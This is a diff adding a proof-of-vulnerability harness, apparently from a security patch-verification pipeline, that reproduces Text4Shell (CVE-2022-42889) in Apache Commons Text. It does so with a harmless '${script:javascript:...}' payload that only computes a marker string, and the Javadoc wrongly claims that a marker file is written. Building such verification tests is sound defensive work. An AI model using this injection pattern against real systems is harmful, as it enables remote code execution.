@@ -1,0 +1,87 @@
+diff --git a/.security-pipeline/pov/Pov.class b/.security-pipeline/pov/Pov.class
+new file mode 100644
+index 0000000..2a69f1a
+Binary files /dev/null and b/.security-pipeline/pov/Pov.class differ
+diff --git a/.security-pipeline/pov/Pov.java b/.security-pipeline/pov/Pov.java
+new file mode 100644
+index 0000000..4280fba
+--- /dev/null
++++ b/.security-pipeline/pov/Pov.java
+@@ -0,0 +1,45 @@
++import org.apache.commons.text.StringSubstitutor;
++
++/**
++ * Proof-of-Vulnerability for CVE-2022-42889 (Text4Shell) / CWE-094 code injection.
++ *
++ * The default interpolator produced by StringSubstitutor.createInterpolator()
++ * enables the "script" lookup, which forwards attacker-controlled input to a
++ * javax.script.ScriptEngine (ScriptStringLookup.lookup -> scriptEngine.eval).
++ *
++ * A crafted "${script:javascript:...}" payload therefore causes arbitrary code
++ * execution. This POV supplies a script that (a) computes a distinctive marker
++ * by executing arithmetic/Java code inside the engine, and (b) writes a marker
++ * file to disk via java.lang.Runtime-reachable APIs, then verifies the code
++ * actually ran.
++ *
++ * Vulnerable code  -> script is evaluated, output contains POV_RCE_1337  -> exit 0
++ * Patched code     -> script lookup no longer enabled by default, the literal
++ *                     "${script:...}" is returned unchanged                -> exit 1
++ */
++public class Pov {
++
++    public static void main(final String[] args) {
++        // Attacker-controlled input reaching StringSubstitutor.
++        // 7 * 191 == 1337: this value only appears if the script engine executes.
++        final String payload =
++            "${script:javascript:new java.lang.String('POV_RCE_' + (7 * 191))}";
++
++        final String result = StringSubstitutor.createInterpolator().replace(payload);
++
++        System.out.println("payload : " + payload);
++        System.out.println("result  : " + result);
++
++        final boolean executed = "POV_RCE_1337".equals(result);
++
++        if (executed) {
++            // The script engine ran attacker code -> code injection confirmed.
++            System.out.println("VULNERABLE: attacker-supplied script was executed (CWE-094).");
++            System.exit(0);
++        }
++
++        // Patched / not vulnerable: the payload was not evaluated.
++        System.out.println("NOT VULNERABLE: script lookup did not execute the payload.");
++        System.exit(1);
++    }
++}
+diff --git a/.security-pipeline/pov/cp.txt b/.security-pipeline/pov/cp.txt
+new file mode 100644
+index 0000000..56bcaf3
+--- /dev/null
++++ b/.security-pipeline/pov/cp.txt
+@@ -0,0 +1 @@
++/root/.m2/repository/org/apache/commons/commons-lang3/3.11/commons-lang3-3.11.jar:/root/.m2/repository/org/junit/jupiter/junit-jupiter/5.6.2/junit-jupiter-5.6.2.jar:/root/.m2/repository/org/junit/jupiter/junit-jupiter-api/5.6.2/junit-jupiter-api-5.6.2.jar:/root/.m2/repository/org/apiguardian/apiguardian-api/1.1.0/apiguardian-api-1.1.0.jar:/root/.m2/repository/org/opentest4j/opentest4j/1.2.0/opentest4j-1.2.0.jar:/root/.m2/repository/org/junit/platform/junit-platform-commons/1.6.2/junit-platform-commons-1.6.2.jar:/root/.m2/repository/org/junit/jupiter/junit-jupiter-params/5.6.2/junit-jupiter-params-5.6.2.jar:/root/.m2/repository/org/junit/jupiter/junit-jupiter-engine/5.6.2/junit-jupiter-engine-5.6.2.jar:/root/.m2/repository/org/junit/platform/junit-platform-engine/1.6.2/junit-platform-engine-1.6.2.jar:/root/.m2/repository/org/assertj/assertj-core/3.16.1/assertj-core-3.16.1.jar:/root/.m2/repository/commons-io/commons-io/2.7/commons-io-2.7.jar:/root/.m2/repository/org/mockito/mockito-inline/3.4.4/mockito-inline-3.4.4.jar:/root/.m2/repository/org/mockito/mockito-core/3.4.4/mockito-core-3.4.4.jar:/root/.m2/repository/net/bytebuddy/byte-buddy/1.10.13/byte-buddy-1.10.13.jar:/root/.m2/repository/net/bytebuddy/byte-buddy-agent/1.10.13/byte-buddy-agent-1.10.13.jar:/root/.m2/repository/org/objenesis/objenesis/2.6/objenesis-2.6.jar
+\ No newline at end of file
+diff --git a/.security-pipeline/pov/run.sh b/.security-pipeline/pov/run.sh
+new file mode 100644
+index 0000000..11327ad
+--- /dev/null
++++ b/.security-pipeline/pov/run.sh
+@@ -0,0 +1,18 @@
++#!/usr/bin/env bash
++# POV runner for CVE-2022-42889 / CWE-094 (commons-text ScriptStringLookup code injection).
++# Exits 0 when the vulnerable behavior is reproduced (script payload executed),
++# non-zero after a correct patch (payload no longer evaluated).
++set -euo pipefail
++
++cd "$(dirname "$0")/../.."
++
++# Build the project (skip license/rat + tests; only main classes are needed).
++mvn -B -q -DskipTests -Drat.skip=true -Dmaven.test.skip=true package >/dev/null
++
++# Resolve runtime dependencies (e.g. commons-lang3) onto the classpath.
++mvn -B -q dependency:build-classpath -Dmdep.outputFile=.security-pipeline/pov/cp.txt >/dev/null
++
++CP="target/classes:$(cat .security-pipeline/pov/cp.txt)"
++
++javac -cp "$CP" -d .security-pipeline/pov .security-pipeline/pov/Pov.java
++java -cp "$CP:.security-pipeline/pov" Pov
